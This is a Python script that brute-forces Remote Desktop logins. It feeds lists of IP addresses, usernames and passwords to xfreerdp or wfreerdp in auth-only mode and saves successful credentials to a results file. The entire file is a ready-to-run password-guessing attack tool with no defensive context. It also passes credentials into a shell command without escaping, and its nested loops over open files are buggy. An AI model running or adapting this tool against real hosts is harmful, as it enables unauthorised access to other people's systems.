# -*- coding: utf-8 -*-

import asyncio
from platform import system as sys_ver
from asyncio import create_subprocess_shell as run
from asyncio.subprocess import DEVNULL


good = 0
completed = 0


# OS Detect
if sys_ver() == 'Windows':
    fr_name = 'wfreerdp.exe'
else:
    fr_name = 'xfreerdp'


async def connect(sem, ip, user, password):
    async with sem:
        global good, completed

        completed += 1
        print(f'Good: {good}; Completed: {completed}', end="\r")

        try:
            r_agr = f"{fr_name} /v:{ip} /port:{port} /u:'{user}' " + \
                     f"/p:'{password}' /cert-ignore +auth-only " + \
                     '+compression /sec:nla'

            a = await run(r_agr, limit=0, stdout=DEVNULL, stderr=DEVNULL)
            await asyncio.wait_for(a.communicate(), timeout=timeout)

            if a.returncode == 0:
                good += 1
                rez = f'{ip}:{port};{user}:{password}\n'
                open('rez/good.txt', 'a', encoding='utf-8').write(rez)
        except asyncio.TimeoutError:
            a.kill()
            return
        except:
            return


async def start():
    tasks = []
    sem = asyncio.Semaphore(threads)

    with open('data/ip.txt', "r", encoding="utf-8") as ips:
        with open('data/users.txt', "r", encoding="utf-8") as users:
            with open('data/passwords.txt', "r", encoding="utf-8") as passws:
                for user in users:
                    user = user.replace('\n', '')
                    for passw in passws:
                        passw = passw.replace('\n', '')
                        for ip in ips:
                            ip = ip.replace('\n', '')
                            task = asyncio.ensure_future(
                                                         connect(sem,
                                                                 ip,
                                                                 user,
                                                                 passw
                                                                 )
                                                        )
                            tasks.append(task)

        responses = asyncio.gather(*tasks)

        await responses


if __name__ == "__main__":
    threads = int(input('Threads: '))
    timeout = int(input('Timeout: '))
    port = int(input('Port: ') or 3389)

    asyncio.run(start())
